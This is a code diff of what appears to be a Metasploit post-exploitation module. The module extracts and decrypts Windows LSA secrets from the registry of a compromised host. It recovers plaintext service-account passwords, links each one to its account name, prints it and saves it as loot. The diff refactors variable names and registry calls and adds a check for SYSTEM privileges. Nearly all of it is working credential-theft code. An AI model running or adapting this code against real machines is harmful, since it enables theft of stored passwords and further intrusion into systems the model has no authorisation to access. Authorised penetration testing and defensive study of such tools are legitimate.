@@ -30,79 +30,70 @@ class Metasploit3 < Msf::Post
     ))
   end
 
-  def reg_getvaldata(key,valname)
-    v = nil
-    begin
-      root_key, base_key = client.sys.registry.splitkey(key)
-      open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
-      vprint_status("reading key: #{key}#{valname}\n")
-      v = open_key.query_value(valname).data
-      open_key.close
-    rescue
-      print_error("Error opening key!")
-    end
-    return v
-  end
 
+  # Decrypted LSA key is passed into this function
+  def get_secret(lsa_key)
+    output = "\n"
 
-  #Decrypted LSA key is passed into this function
-  def get_secret(lkey)
-    sec_str = "\n"
+    # LSA Secret key location within the registry
+    root_regkey = "HKLM\\Security\\Policy\\Secrets\\"
+    services_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\"
 
-    #LSA Secret key location within the register
-    root_key = "HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\"
+    secrets = registry_enumkeys(root_regkey)
 
-    key_arr = meterpreter_registry_enumkeys(root_key)
+    secrets.each do |secret_regkey|
+      sk_arr = registry_enumkeys(root_regkey + "\\" +  secret_regkey)
+      next unless sk_arr
 
-    key_arr.each do |keys|
-      mid_key = root_key + "\\" +  keys
-      sk_arr = meterpreter_registry_enumkeys(mid_key)
       sk_arr.each do |mkeys|
-        #CurrVal stores the currently set value of the key, in the case of
-        #services it usually come out as plan text
-        if(mkeys == "CurrVal")
-          val_key = root_key + "\\" + keys + "\\" + mkeys
-          v_name = ""
-          sec = reg_getvaldata(val_key, v_name)
-          if( @vista == 1 )
-            #Magic happens here
-            sec = sec[0..-1]
-            sec = decrypt_lsa_data(sec, lkey)[1..-1].scan(/[[:print:]]/).join
-          else
-            #and here
-            sec = sec[0xC..-1]
-            sec = decrypt_secret_data(sec, lkey).scan(/[[:print:]]/).join
-          end
+        # CurrVal stores the currently set value of the key. In the case
+        # of services, this is usually the password for the service
+        # account.
+        next unless mkeys == "CurrVal"
 
-          if(sec.length > 0)
-            if(keys[0,4] == "_SC_")
-              user_key = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\"
-              keys_c = keys[4,keys.length]
-              user_key = user_key << keys_c
-              n_val = "ObjectName"
-              user_n = reg_getvaldata(user_key, n_val)
+        val_key = root_regkey + "\\" + secret_regkey + "\\" + mkeys
+        encrypted_secret = registry_getvaldata(val_key, "")
 
-              #if the unencrypted value is not blank and is a service, print
-              print_good("Key: #{keys} \n Username: #{user_n} \n Decrypted Value: #{sec}\n")
-              sec_str = sec_str << "Key: #{keys} \n Username: #{user_n} \n Decrypted Value: #{sec}\n"
-            else
-              #if the unencrypted value is not blank, print
-              print_good("Key: #{keys} \n Decrypted Value: #{sec}\n")
-              sec_str = sec_str << "Key: #{keys} \n Decrypted Value: #{sec}\n"
-            end
-          else
-            next
-          end
+        if @vista == 1
+          # Magic happens here
+          decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
+        else
+          # and here
+          encrypted_secret = encrypted_secret[0xC..-1]
+          decrypted = decrypt_secret_data(encrypted_secret, lsa_key)
+        end
+
+        next unless decrypted.length > 0
+
+        # axe all the non-printables
+        decrypted = decrypted.scan(/[[:print:]]/).join
+
+        if secret_regkey.start_with?("_SC_")
+          # Service secrets are named like "_SC_yourmom" for a service
+          # with name "yourmom". Strip off the "_SC_" to get something
+          # we can lookup in the list of services to find out what
+          # account this secret is associated with.
+          svc_name = secret_regkey[4,secret_regkey.length]
+          svc_user = registry_getvaldata(services_key + svc_name, "ObjectName")
+
+          # if the unencrypted value is not blank and is a service, print
+          print_good("Key: #{secret_regkey}\n Username: #{svc_user} \n Decrypted Value: #{decrypted}\n")
+          output  << "Key: #{secret_regkey}\n Username: #{svc_user} \n Decrypted Value: #{decrypted}\n"
+        else
+          # if the unencrypted value is not blank, print
+          print_good("Key: #{secret_regkey}\n Decrypted Value: #{decrypted}\n")
+          output  << "Key: #{secret_regkey}\n Decrypted Value: #{decrypted}\n"
         end
       end
     end
-    return sec_str
+
+    return output
   end
 
   # The sauce starts here
   def run
 
-    hostname = session.sys.config.sysinfo['Computer']
+    hostname = sysinfo['Computer']
     print_status("Executing module against #{hostname}")
 
     print_status('Obtaining boot key...')
@@ -110,10 +101,14 @@ class Metasploit3 < Msf::Post
     vprint_status("Boot key: #{bootkey.unpack("H*")[0]}")
 
     print_status('Obtaining Lsa key...')
-    lsakey = capture_lsa_key(bootkey)
-    vprint_status("Lsa Key: #{lsakey.unpack("H*")[0]}")
+    lsa_key = capture_lsa_key(bootkey)
+    if lsa_key.nil?
+      print_error("Could not retrieve LSA key. Are you SYSTEM?")
+      return
+    end
+    vprint_status("Lsa Key: #{lsa_key.unpack("H*")[0]}")
 
-    secrets = hostname << get_secret(lsakey)
+    secrets = hostname + get_secret(lsa_key)
 
     print_status("Writing to loot...")
 
